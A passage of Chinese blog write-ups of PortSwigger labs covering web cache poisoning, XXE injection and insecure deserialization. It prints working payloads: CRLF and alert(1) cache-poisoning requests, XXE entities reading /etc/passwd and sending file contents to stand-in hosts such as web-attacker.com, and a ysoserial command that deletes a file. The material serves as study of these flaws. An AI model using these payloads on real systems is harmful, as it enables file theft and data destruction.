利用多个参数实现缓存参数隐藏\n听着很高深，实际很简单：通过 GET 请求的问号(?)进行攻击。我们都知道 GET 请求的参数都是通过问号来传递的。\n\n如果一个 GET 请求中有多个问号，就会以第一个问号作为查询参数的开始，后面的问号中的参数就不会被作为缓存键处理。我们以下面一个 GET 请求作为例子进行说明。\n\n\nGET &#x2F;?example&#x3D;123?excluded_param&#x3D;bad-stuff-here\n\n这时，excluded_param 就不会被作为缓存键处理。\n有些框架比较特殊，例如 Ruby on Rails 框架将与(&amp;)和分号 (;)作为参数分隔符。但是如果缓存不支持这样解析参数，就会造成差异。\nGET &#x2F;?keyed_param&#x3D;abc&amp;excluded_param&#x3D;123;keyed_param&#x3D;bad-stuff-here\n\n以此请求为例，eyed_param 就会被视为缓存键，而excluded_param 不会，而且只会被缓存解析成两个参数。\nkeyed_param&#x3D;abc \nexcluded_param&#x3D;123;keyed_param&#x3D;bad-stuff-here\n\n会被 Ruby on Rails 进一步解析成三个参数\nkeyed_param&#x3D;abc \nexcluded_param&#x3D;123 \nkeyed_param&#x3D;bad-stuff-here\n\n此时 keyed_param 的值就会被覆盖为 bad-stuff-here，也会得到由这个值生成的响应，但是在缓存看来只要该参数值为 abc 的都会被视为该响应的等效请求。利用这种特点可以发动 JSONP 攻击，它会将回调函数名附在查询参数中。\nGET &#x2F;jsonp?callback&#x3D;innocentFunction\n\n我们可以利用上面的特点替换成我们指定的函数名。\n\nLab: Parameter cloaking\n有了上面的学习过程，做起靶场来健步如飞(诶好像我的比喻不太恰当)。\n抓包定位于 “GET &#x2F;js&#x2F;geolocate.js?callback&#x3D;setCountryCookie”\n在执行 Web Cache 投毒攻击之前，我们需要先确定所用的框架 ———— 例如 Ruby on Rails 框架，这是为了构造对应的 Payload。其次进行 Fuzz 测试，探测一下可攻击的查询关键字。\n\n探测过程先行省略，这里挂一下 Payload\n\nGET &#x2F;js&#x2F;geolocate.js?callback&#x3D;setCountryCookie&amp;utm_content&#x3D;foo;callback&#x3D;alert(1)\n记得发包至 X-Cache: hit 的状态\n\n\n5. 利用 Fat GET 请求发起攻击Fat GET 请求，可以有两个参数值，一个放在问号后面，另外一个在 HTTP Body 当中，如下 HTTP 请求所示。这里的 param 会成功覆盖 ?param=innocent 使得 param 成为 bad-stuff-here\nGET &#x2F;?param&#x3D;innocent HTTP&#x2F;1.1 \n… \nparam&#x3D;bad-stuff-here\n\n如果 X-HTTP-Method-Override 头也是非缓存键，我们可以构造伪 POST 请求来攻击，例如\nGET &#x2F;?param&#x3D;innocent HTTP&#x2F;1.1\nHost: innocent-website.com\nX-HTTP-Method-Override: POST\n…\nparam&#x3D;bad-stuff-here\n\n\nLab: Web cache poisoning via a fat GET request\n实现起来也比较简单，这里便直接挂 Payload，但是实战渗透的时候别忘记 Fuzz 测试。\n发包接口 /js/geolocate.js\n\n这里有个小坑 —— callback=alert(1) 需要放到 Connection 后两行，不然会发包失败。\n\n还有一个小坑，这里发包之前要先修改 callback 为随意数据，将 setCountryCookie 修改之后才能将 callback 赋值为 alert(1)。\n\n\n这样的攻击方法在缓存看来直接访问首页的人会被识别成等效页面而接收到缓存副本，在后台看来会识别成 POST 方法而读取覆盖之后的 callback 参数的值而返回投毒响应，从而使得投毒生效。\n如此发包之后，再将 callback 修改为我们的 Payload\ncallback&#x3D;alert(1)\n\n这里我直接把数据包发到 Intruder 下，使用 Null Payloads 发包解决 ~\n\n\n6. 利用资源导入中的动态内容进行攻击有的时候虽然看上去是导入静态文件，但是也可以向查询字符串中注入恶意 payload 构造某些攻击，例如下面这个 HTTP 请求。\nGET &#x2F;style.css?excluded_param&#x3D;123);@import… HTTP&#x2F;1.1 \n\nHTTP&#x2F;1.1 200 OK \n… \n@import url(&#x2F;site&#x2F;home&#x2F;index.part1.8a6715a2.css?excluded_param&#x3D;123);@import…\n\n甚至可以尝试 XSS payload\nGET &#x2F;style.css?excluded_param&#x3D;alert(1)%0A&#123;&#125;*&#123;color:red;&#125; HTTP&#x2F;1.1 \n\nHTTP&#x2F;1.1 200 OK \nContent-Type: text&#x2F;html \n… \nThis request was blocked due to…alert(1)&#123;&#125;*&#123;color:red;&#125;\n\n7. 缓存解析 URL 编码的隐患原本的 XSS 攻击里面，是不能使用 URL 编码进行绕过的，如果使用 URL 编码是不会被后端所解析的；但是缓存不同，会自动进行 URL 解码。\n我们 在Web 缓存还处于生效，给受害者投放带 Payload 的 URL 即可。\n\nLab: URL normalization\n\n\n8. 缓存键注入我们还可以利用双下划线(__)分隔不同的字段，让两个不同的请求识别为等效请求。\nGET &#x2F;path?param&#x3D;123 HTTP&#x2F;1.1 \nOrigin: &#39;-alert(1)-&#39;__ \n\nHTTP&#x2F;1.1 200 OK \nX-Cache-Key: &#x2F;path?param&#x3D;123__Origin&#x3D;&#39;-alert(1)-&#39;__ \n...\n\n&lt;script&gt;…&#39;-alert(1)-&#39;…&lt;&#x2F;script&gt;\n\n下面这一请求则是等效请求，会造成 Web Cache 投毒\nGET &#x2F;path?param&#x3D;123__Origin&#x3D;&#39;-alert(1)-&#39;__ HTTP&#x2F;1.1 \n\nHTTP&#x2F;1.1 200 OK \nX-Cache-Key: &#x2F;path?param&#x3D;123__Origin&#x3D;&#39;-alert(1)-&#39;__ \nX-Cache: hit \n\n...\n\n&lt;script&gt;…&#39;-alert(1)-&#39;…&lt;&#x2F;script&gt;\n\n\nLab: Cache key injection)\n这道题目比较难，如果只是以了解为主的同学可以放一放。\n我们需要构造一条 Web Cache 投毒链，因为访问首页会自动跳转到 &#x2F;login，所以我们需要先在 &#x2F;js&#x2F;localize.js 中构造 Payload 然后在 &#x2F;login 构造 Payload。\n经过 Fuzz 测试，utm_content 和 Origin 的值是可控的，但是 URL 里面的 x 就只能是 x&#x3D;1，这个 x&#x3D;1 是开启缓存功能的开关。\n我们先看 &#x2F;js&#x2F;localize.js 中构造的 Payload\nGET &#x2F;js&#x2F;localize.js?lang&#x3D;en?utm_content&#x3D;z&amp;cors&#x3D;1&amp;x&#x3D;1 HTTP&#x2F;1.1 \nOrigin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$\n\n\n这里的 Payload 构造是有一定难度的，首先是 CRLF 注入，CR 为回车符，LF 为换行符，CRLF 相当于进行换行的操作，这样可以让我们在一个 HTTP Header 字段中注入多个参数。%20 为空格，%0a 为换行。\n\n接着，我们在 Origin 字段当中实现我们的 XSS 攻击，为了能将请求的内容注入到响应中，我们需要开启 CORS，即将 cors&#x3D;0 改为 cors&#x3D;1\n\n\n\n\n下一步我们构造 &#x2F;login 处的 payload\nGET &#x2F;login?lang&#x3D;en?utm_content&#x3D;x%26cors&#x3D;1%26x&#x3D;1$$Origin&#x3D;x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP&#x2F;1.1\n\n因为我们已经利用 &#x2F;js&#x2F;localize.js 构造 Web 缓存，那么在 &#x2F;login 的 URL 里面直接构造这样的 payload 会被缓存识别为等效页面而投放中毒缓存。\n\n\n9. 内部缓存投毒有点 CSRF 的味道吧，和之前的攻击方法很像，这里就不展开讲了。不同之处在于，因为是缓存键的问题，我们不需要先找一个不被键入的参数。也就是不需要尝试 ?Cb=1234 那种先行测试方式了。\n但是从攻击的角度来说很类似于 XXE 中的复用本地 DTD 的意思。\n\nLab: Internal cache poisoning\n先用 Param Miner 扫一下，探测结果是 X-Forwarded-Host 字段可用。\n尝试输入 X-Forwarded-Host: 123 发现每次发包都会有地方变成 123，看来可控的地方非常之多啊 ~\n\n\n因为每一次加载页面，都会自动加载 /js/geolocate.js 文件，于是我们在 Exploit Server 中构造 /js/geolocate.js 的恶意 Payload。\n\n\n多发几次包，使得可控的地方全部变成我们的恶意 Payload\n0x06 Web Cache 投毒的防御1) Web 缓存投毒漏洞非常隐蔽，决定开启缓存功能的应用程序一定要进行严格的安全防护，尽量使用静态响应及对导入的资源进行校验。尽可能修复客户端漏洞以防止被进一步利用。\n(2) 应禁止模棱两可的请求方法，如 fat Get 方法。应尽可能禁用不需要的一切 HTTP 头字段，无论多罕见。\n0x07 小结一下Web Cache 投毒攻击还是那句话，危害高于 CORS，低于 CSRF，它更是一种扩大战果的工具，最近学习 Web Cache 还是有点耗费精力。\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-XXE注入","url":"/2021/09/27/PortSwigger-XXE%E6%B3%A8%E5%85%A5/","content":"Port XXE\n\n0x01 什么是XMLXML: 可以简单的将XML理解为传输文件时的文件，详细见小白须知的XML知识\n0x02 什么是XML外部实体注入​    XML外部实体注入(也称为XXE)是一个网络安全漏洞，允许攻击者干扰应用程序对XML数据的处理。\n​    它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。\n\n在某些情况下，攻击者可以通过利用XXE漏洞执行SSRF攻击来升级XXE攻击，从而损害基础服务器或其他后端基础架构。\n\n0x03 需要明白的几个概念1.XML实体类似于html中的标签&lt;&gt;以及&lt;and&gt;的这些标签\n2.文档类型定义文档类型定义——————全称Document Type Definition，用来验证XML文件书写是否符合标准，可以定在在XML文档开头，也可以在内部，也可以在节点声明。\n3.XML自定义实体类似于C语言当中的类，XML允许在DTD中自定义实体，例如\n&lt;!DOCTYPE foo [&lt;!ENTITY myentity &quot;my entity value&quot;&gt;]&gt;\n\n在此XML语句中，先声明了一个名为foo的DTD，然后在DTD中声明了一个自定义实体，名为myentity，该自定义实体中的数据为”my entity value”，可以使用&amp;myentity&amp;的方式对其引用。\n4.XML外部实体是自定义实体当中的一种，它声明的在DTD之外，外部实体的声明使用SYSTEM关键字，然后指定加载实体值的URL，例如\n&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM \"https://baidu.com\" > ]>\n\nURL也可以是使用file伪协议从而加载指定的文件内容，例如\n&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM \"file:///path/to/file\" > ]>\n\nXXE漏洞就是利用上述特性进行攻击\n\n0x04 XXE注入的实际应用1. 利用XXE检索文件(file)例如，某购物应用程序通过以下XML代码来检查产品库存\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;stockCheck>&lt;productId>381&lt;/productId>&lt;/stockCheck>\n\n而若该应用程序对XXE注入不执行特定防御，通过修改&#x2F;添加 DTD的方式：\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n&lt;stockCheck>&lt;productId>&amp;xxe;&lt;/productId>&lt;/stockCheck>\n\n\n从而读取到一些关键的信息\n\n查看一下抓包到的信息，如图\n\n\n并自己加入自定义实体\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt;\n\n并将&lt;productId&gt;的值修改为 &amp;xxe;(注意！必须带分号，不然报错)\n如图所示\n\n\n2.利用XXE执行SSRF利用XXE执行SSRF的原理与文件读取相类似\npayload:\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;internal.vulnerable-website.com&#x2F;&quot;&gt; ]&gt;\n\n0x04 XXE盲注XXE盲注，类似于SQL盲注，即无回显，所以无法直接检索服务器端文件\n有两种广泛的方法可以发现和利用盲目的XXE漏洞：\n\n触发带外网络交互，有时在交互数据中渗出敏感数据。\n\n触发 XML 解析错误，使错误消息包含敏感数据。\n\n\n1.使用(OAST带外交互技术)—–Burp-Collaborator[什么是Burp-Collaborator](Burp Collaborator的使用 - 唤起一天明月 (withd-raw.github.io))\n\n  下面提到的”YOUR-SUBDOMAIN-HERE.burpcollaborator.net”指的就是Burp-Collaborator所copy的\n\npayload:\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&quot;&gt; ]&gt;\n\n\n有时，使用常规的XXE攻击会被阻止，这是因为常规外部实体被禁用了\n所以我们可以尝试使用参数实体\n\n\nXML参数实体的定义需要将本是实体名的参数改为”%”\n\npayload:\n&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&quot;&gt; %xxe; ]&gt;\n\n\n\n\n还可以将数据外带出来\n\n在服务器下添加\npayload:\n&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hostname&quot;&gt;\n&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http:&#x2F;&#x2F;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;\n%eval;\n%exfil;\n\n\n简单解读一下这段payload是什么意思\n\n这里声明了两个参数实体: 1.file参数实体，用来存储与读取敏感文件/etc/passwd；2.eval参数实体，当中定义了另一个参数实体exfiltrate，而此payload的作用即为将参数实体file包含的数据附加在url中发出的请求，从而达到泄露数据的目的。\n\n为了达到泄露数据的目的，需要将内容封装成一个DTD托管在目标服务器上\n\n“YOUR-URL-DTD”就是上一段读取/etc/passwd的恶意的DTD\n&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;YOUR-URL-DTD&quot;&gt; %xxe;]&gt;\n\n直接干讲比较难理解，这里以靶场为例\n先在对方服务器创建一个恶意的外部DTD\n接着，抓包XML页面，并添加DTD即可，前面提到的&quot;YOUR-URL-DTD&quot;也在图里体现\n添加DTD即可\n&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;YOUR-URL-DTD&quot;&gt; %xxe;]&gt;\n\n2.XXE盲注之报错注入(有点类似于SQL报错注入)\n我们先回顾一下之前的盲注—–只是通过OAST技术\n那与SQL盲注一样，尝试报错注入\n\n&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;\n&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;web-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt; &#x2F;&#x2F;这里引用的URL不一定真实存在，可以通过报错来获取数据\n%eval;\n%exfiltrate;\n\n类似的payload：\n“YOUR-URL-DTD”就是上一段读取/etc/passwd的恶意的DTD\n&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;YOUR-URL-DTD&quot;&gt; %xxe;]&gt;\n\n先在对方服务器创建一个恶意的外部DTD\n\n\n接着，抓包XML页面，并添加DTD即可，前面提到的&quot;YOUR-URL-DTD&quot;也在图里体现\n从上面我们能看到加载了一个不存在的文件触发XML报错，但是后面加载的file实体指定的文件是存在的，所以XML报错信息中就能泄漏这个文件的内容了\n\n\n3.通过复用本地DTD进行XXE盲注\n首先，这里的本地指的是对方服务器本地存在的DTD，例如 使用GNOME桌面环境的Linux系统通常有一个DTD文件。\n我们使用这个payload对文件进行存在性测试\n\n由于此DTD文件存在的位置为/usr/share/yelp/dtd/docbookx.dtd\n使用的payload为:\n&lt;!DOCTYPE foo [\n&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd&quot;&gt;\n&lt;!ENTITY % custom_entity &#39;\n&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;\n&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt;\n%eval;\n%error;\n&#39;&gt;\n%local_dtd;\n]&gt;\n\n讲解一下这段payload，我们先复用了本地的一个DTD：&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd,而这个内部DTD中有一个参数实体叫custom_entity,然后我们重写这个参数实体。\n\n在参数实体内部声明参数实体时关键字需要使用它的html编码格式。\n\n使用的方式与报错注入类似，难点在于能否找到本地的DTD\n\n\n0x05 非XML格式，发起XXE攻击1. XInclude攻击  有些应用程序的服务端会将从客户端接收的内容嵌入到XML文档中然后解析，这就导致因为我们无法控制整个XML文档而无法发动常规的XXE攻击。\n  但是我们可以通过XInclude在该XML文档中构建子XML文档，想要使用XInclude我们需要引入相应的命名空间。\n这里的payload以使用file函数读取文件为例\n&lt;foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n&lt;xi:include parse=\"text\" href=\"file:///etc/passwd\"/>&lt;/foo>\n\n将值修改为xml，如图\n\n\n2.通过文件上传进行XXE注入原理：某些应用程序允许用户上传文件，然后处理服务器端。某些常见文件格式使用XML或包含XML子组件。基于XML的格式例如DOCX和SVG。\npayload:\n&lt;?xml version=\"1.0\" standalone=\"yes\"?>&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>&lt;svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">&lt;text font-size=\"16\" x=\"0\" y=\"16\">&amp;xxe;&lt;/text>&lt;/svg>\n\n一般作为头像上传，能够在图像(头像)中看到&#x2F;etc&#x2F;hostname文件的内容\n\n\n3.修改HTTP请求中的content进行XXE注入例如我们看到的HTML表单\nPOST /action HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 7\n\nfoo=bar\n\n可以通过XML的方式进行攻击\nPOST /action HTTP/1.0\nContent-Type: text/xml\nContent-Length: 52\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>&lt;foo>bar&lt;/foo>\n\n0x06 如何寻找XXE注入的漏洞\n看到XML-DTD之后，进行file命令尝试\n通过基于URL的XML-DTD的盲注，通过Burp Collaborator\n使用XInclude攻击尝试检索已知操作系统文件，\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-不安全的反序列化","url":"/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"PortSwigger-不安全的反序列化\n\n\n0x01 前言\n刷这个专题的时候是有一点反序列化漏洞的基础了，主要是 PHP 的反序列化，魔法函数的使用。所以对序列化已经有一点基础的了解了。\n\n0x02 概念明晰\n先弄懂序列化，反序列化，不安全的反序列化都是什么\n\n1.序列化是什么，反序列化是什么\n序列化，将复杂的东西转化为编码的操作，比如将类转化成一串编码，实现方式是 .serialization()\n\n以这串 php 代码为例，体验一下序列化\n$user->name = \"carlos\"; \n$user->isLoggedIn = true;\n\n输出—> O:4:\"User\":2:&#123;s:4:\"name\":s:6:\"carlos\"; s:10:\"isLoggedIn\":b:1;&#125;\n\nO:4:\"User\" - 具有 4 个字符的类名的对象 \"User\"\n2 - 对象有2个属性\ns:4:\"name\" - 第一个属性的键是 4 个字符的字符串 \"name\"\ns:6:\"carlos\" - 第一个属性的值是 6 个字符的字符串 \"carlos\"\ns:10:\"isLoggedIn\" - 第二个属性的键是 10 个字符的字符串 \"isLoggedIn\"\nb:1 - 第二个属性的值是布尔值 true\n\n\n反序列化，将编码转换为复杂的东西，比如将编码转换为一个类，实现方式是 .deserialization\n\n以这串 php 代码为例，体验一下反序列化\n $str = 'O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D';\n\n $data = urldecode($str);\n $obj = unserialize($data);\n var_dump($obj);\n ?>\n\t \n输出---> O:4:\"test\":2:&#123;s:10:\"testflag\";s:9:\"flag&#123;233&#125;\";s:1:\"a\";s:3:\"aaa\";&#125;\n\n序列化与反序列化之间可以互相转换，也就是说，我序列化操作过去的东西，一定能够通过反序列化原模原样得拿回来，原理如图所示。\n\n\n2. 什么是不安全的反序列化\n不安全的反序列化是指进行序列化与反序列化操作的数据可以被用户控制，从而使得用户得以操作序列化对象，造成各种攻击。\n\n不安全的反序列化主要被分为两类：\n序列化对象被替换这种不安全的反序列化，应用最多的便是 Public 的对象被修改为 Private，轻则替换类的范围(也就是 Public，Private 之间的)；重则替换一整个类，将序列化对象替换为完全不同类的对象。因此，不安全的反序列化有时称为 “对象注入” 漏洞。\n在反序列化之前发生异常，导致反序列化直接被跳出\n最有代表性的可以是 php 反序列化中的 __destruct 魔法函数，师傅们可以移步至 php反序列化 观看\n\n这种情况在 Port 官方靶场上被称作意外类的对象导致的异常。\n3. 产生不安全的反序列化的根本原因\n一句话总结：过于信任用户的输入\n\n4. 不安全的反序列化的危害\n最有可能的是 RCE，我们熟知的 Shiro 550，Shiro 721 以及其他的一些反序列化漏洞。\n其他次要一些的有提权、任意文件读取、DDoS、信息泄露\n\n0x03 开打！不安全反序列化的利用1. 判断不安全的反序列化的存在什么叫判断漏洞存在\n判断漏洞存在的意思比较好理解，也就是证明当前界面存在某个漏洞。例如我们要证明某个 Web 中存在 XSS，我们只需要构造 alert(1) 的 POC 即可。对于不安全的反序列化也是一样。\n\n如何识别不安全的反序列化漏洞识别不安全的反序列化比较简单，不论是在黑盒测试还是白盒测试当中。\n在渗透测试的过程中，抓包查看数据，审计看起来像序列化是数据，例如 token，session 的地方。对这些地方进行测试，观察能否控制输入。\n像这串 demo 代码，Cookie 便是一个易受攻击的反序列化点，在任何时候都不会检查 Cookie 对象的真实性，在这种情况下，会造成很多漏洞。\n$user = unserialize($_COOKIE); \nif ($user->isAdmin === true) \n&#123; // allow access to admin interface &#125;\n\n\n直接来看一道靶场，详细感受一下什么叫不安全的反序列化。\n\n\nLab: Modifying serialized objects\n题目让我们越权删除 Carlos 的账户。\n登录上 wiener 的账号，并在 &#x2F;Accout 接口下抓包，如图所示，我们上文说了，\n\n\n将这一串 Session 提出来，进行 Base64 解码\n\n\n猜测在 admin 边上的字段 b，是用来判断是否是 admin 权限的，于是将 “0” 修改为 “1”，再重新进行 base64 编码。\n\n\n这里 “O30%3d” 需要单独拿出来，不需要进行 base64 编码。接着，使用 “Show Response in browser”，注意，此时需要开启 Burpsuite 的代理模式，否则访问不通\n\n\n再进行删除即可，我自己做题的时候遇到了一点困难，但是对删除的包进行修改 Cookie，导致越权删除同样奏效。\n\n\n在上题当中，Cookie 就是过分信任用户的输入，易受用户修改，从而导致了不安全的反序列化，下面我们多讲一讲攻击手段。\n\n2. 修改数据类型修改数据类型多数出现在 PHP 弱判断的题目当中。\nphp中有两种比较的符号\n它们分别是 == 与  ===\n\n1 &lt;?php\n2 $a = $b ;\n3 $a===$b ;\n4 ?>\n\n\n&#x3D;&#x3D;&#x3D; 在进行比较的时候，先判断两种字符串的类型是否相等，再比较；三个等于号的判断方式被称作严格判断\n&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较。也被称作松散比较\n\n// php的\"==\"\n1 &lt;?php\n2 var_dump(\"admin\"==0);  //true\n3 var_dump(\"1admin\"==1); //true\n4 var_dump(\"admin1\"==1) //false\n5 var_dump(\"admin1\"==0) //true\n6 var_dump(\"0e123456\"==\"0e4456789\"); //true \n7 ?>  //上述代码可自行测试\n\n当这种松散比较与过于信任用户输入同时出现时，肯定有洞。\n例如下面这一段逻辑判断代码，只要存储的密码不以数字开头，那么松散比较的返回结果始终为 True\n$login = unserialize($_COOKIE) \nif ($login['password'] == $password) &#123; \n\t// log in successfully \n&#125;\n\n这时的你是否已经有攻击思路了呢，我们以 Port 靶场体验一下。\n\nLab: Modifying serialized data types\n\n题目还是要求我们提权\n\n老样子抓包，拿 Cookie 分析\n\n\n因为我们要以 “username&#x3D;administrator” 登录进去，所以这里的 username，我们从 wiener 修改为 administrator，同时对应 username 的 s (也就是 username 的长度) 要修改为 13。\n现在 username 修改好了，还剩 password，按照题意的话，是根据 access_token 验证身份的，所以我们这里猜测对应的 access_token 不含任何数字，构造 payload\nO:4:\"User\":2:&#123;s:8:\"username\";s:13:\"administrator\";s:12:\"access_token\";i:0;&#125;\n\n再进行 base64 编码并发包\n\n\n成功提权，还是按照上题一样，在删除的接口下进行提权，直接删除。\n\n\n3. 使用应用程序功能，这里个人认为称作水平提权更合适\n所谓的使用应用程序功能，在不安全的反序列化当中，也就是水平提权。下面我们举个通俗易懂的例子。\n网站允许用户删除自己的数据的时候，我们作为普通用户，可以通过水平提权的方式删除同样是用户权限的其他人。而这个”删除”功能，就是所谓的 应用程序功能，所以我觉得称为水平提权更合理。\n\n对应的靶场\n\nLab: Using application functionality to exploit insecure deserialization\n\n题目要求我们作为 wiener 的情况下，删除 carlos 在 &#x2F;home&#x2F;carlos 目录下的 morale.txt 文件。\n\n先抓包，把 Cookie 拿出来分析一下，发现有个 “avatar_link” 的模块，因为我们要删除 &#x2F;home&#x2F;carlos&#x2F;morale.txt 这一路径的 “morale.txt” 文件，所以 payload 如下，这里不要忘记修改 s 的值，因为它代表了长度。\nO:4:\"User\":3:&#123;s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"t28geo7k62c64bycybe8yq8h93lzvdmi\";s:11:\"avatar_link\";s:23:\"/home/carlos/morale.txt\"\n\n\n\n4. 利用魔术方法进行反序列化攻击\n魔术方法的定义，魔术方法是方法的特殊子集，一般情况下不会出现的，但每当发生特定事件或方案时，都会被自动调用。\n\n我帮大家理出一下 PHP，Java，Python 都有哪些魔法函数\n__construct()    #类的构造函数  \n__destruct()    #类的析构函数  \n__call()    #在对象中调用一个不可访问方法时调用  \n__callStatic()    #用静态方式中调用一个不可访问方法时调用  \n__get()    #获得一个类的成员变量时调用  \n__set()    #设置一个类的成员变量时调用  \n__isset()    #当对不可访问属性调用isset()或empty()时调用  \n__unset()    #当对不可访问属性调用unset()时被调用。  \n__sleep()    #执行serialize()时，先会调用这个函数  \n__wakeup()    #执行unserialize()时，先会调用这个函数  \n__toString()    #类被当成字符串时的回应方法  \n__invoke()    #调用函数的方式调用一个对象时的回应方法  \n__set_state()    #调用var_export()导出类时，此静态方法会被调用。  \n__clone()    #当对象复制完成时调用  \n__autoload()    #尝试加载未定义的类  \n__debugInfo()    #打印所需调试信息\n\n不同的魔法函数都可以构造对应的不安全的反序列化，但是攻击者构造 POC 的前提是获得到了后端判断的源代码，进行代码审计，从而设计 POC，否则将难以攻击。\n\n下面是一道简单的 PHP 魔法函数的代码审计。\n\n\nLab: Arbitrary object injection in PHP\n\n题目要求我们删除 &#x2F;home&#x2F;carlos&#x2F;morale.txt 这一文件\n\n进入靶场，因为这道题需要源代码的代码审计，在 Burpsuite 的 Sitemap 中发现了一个静态资源 /libs/CustomTemplate.php。如果直接在 Web 下打开这一接口，返回的页面是空。\n\n尝试 /libs/CustomTemplate.php~，在 PHP 中，结尾带有 ~，很可能是备份文件。访问成功，把源码拉下来。\n\n在后面看到有 PHP 的魔法函数 ———— __construct() 与 __destruct()，感觉可以利用。毕竟是代码审计嘛，我们把两个魔法函数拉出来审计一下。\n\n__construct 函数进行了简单赋值的工作\n\npublic function __construct($template_file_path) \n&#123;\n $this->template_file_path = $template_file_path;\n $this->lock_file_path = $template_file_path . \".lock\";\n &#125;\n\n\n__destruct() 中的 unlink 函数用于删除文件，这里给我们提供了攻击思路，只需要我们修改 lock_file_path 为 /home/carlos/morale.txt 文件即可进行攻击。\n\nfunction __destruct() \n&#123;\n // Carlos thought this would be a good idea\n if (file_exists($this->lock_file_path)) \n &#123;\n unlink($this->lock_file_path);\n &#125;\n &#125;\n\n先使用 Port 提供给我们的 wiener 与 peter 登录，再对 Accout 界面进行抓包，将 lock_file_path 修改为 /home/carlos/morale.txt \n\n\n将 Session 值放入 Decoder 模块，并修改为如下\nO:14:\"CustomTemplate\":1:&#123;s:14:\"lock_file_path\";s:23:\"/home/carlos/morale.txt\";&#125;\n\n\n\n将我们编写好的 payload 进行编码，替换 Session；发包即可。\n5. Gadget Chain 一些反序列化构造的工具\n这一块主要是 Gadget Chain 这一概念，之前自己学习的时候也是概念不清楚，卡了一会儿。\n\nGadget Chain 其实就是我们所说的通用 payload，在我们输入要任意执行的命令 ———— 例如 whoami,ipconfig 等命令时，Gadget Chain 会帮我们进行自动编码，减轻负担。\nJava反序列化的一个这样的工具是 “ysoserial”。我们在使用它的时候先选择对应的框架，然后传入要执行的命令。\n然后，它基于所选链创建适当的序列化对象，当然有一定的精准度，但是可以提高我们的渗透效率。\n\n我个人把它理解为黑盒测试，不断尝试 payload。\n这里 Port 向我们介绍了一样工具 ———— ysoserial，用来进行反序列化的构造。\n\n(1) 使用 ysoserial 构造 payload\nLab: Exploiting Java deserialization with Apache Commons\nPort 已经告诉我们问题是 Commons Collections 链，所以我们可以直接构造 payload，设置参数为 Commons Collections 即可；但转念一想，若我们不知道框架当中的问题是 Commons Collections，便可以通过黑盒测试逐个尝试。\n日常登录后抓包，并对 Accout 界面进行 Session 构造 payload。使用 ysoserial 来构造 payload\njava -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64\n\n\n注意一点：ysoserial 只能用于 Java 8 版本及一下，要不然会报错的\n\n\n\n接着将这一串 base64 码进行 url 编码\n再替换 Session；至于 CC 链的构造，之后学习 Java 代码审计的部分会细讲。Port 这部分还是注重漏洞挖掘为主。\n(2) 使用 PHPGGC 构造 payload下载地址 PHPGGC。用法和 ysoserial 类似，也是输入对应的框架，比如 PHP Symfony 4.3.6，Symfony 3.3 等。\n一般的思路都是先去找到该 Web 界面用的是何种框架，再针对框架进行攻击。\n\nLab: Exploiting PHP deserialization with a pre-built gadget chain\n\n题意：删除 &#x2F;home&#x2F;carlos&#x2F;marale.txt 文件\n\n先将 Cookie 